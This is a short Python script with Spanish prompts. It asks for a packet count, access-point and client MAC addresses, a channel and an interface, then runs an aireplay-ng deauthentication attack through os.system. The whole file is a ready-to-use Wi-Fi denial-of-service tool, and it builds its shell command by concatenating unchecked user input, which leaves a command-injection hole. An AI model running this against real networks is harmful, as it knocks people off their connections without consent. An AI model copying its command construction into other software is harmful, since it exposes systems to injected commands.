import os

num = input("Numero de paquetes > ")
mac_ap = input("MAC AP > ")
mac_cliente = input("MAC Cliente > ")
c = input("Canal > ")
interfaz = input("Interfaz > ")

os.system("aireplay-ng --deauth " + num + " -a " + mac_ap + " -c " + mac_cliente + " " + interfaz)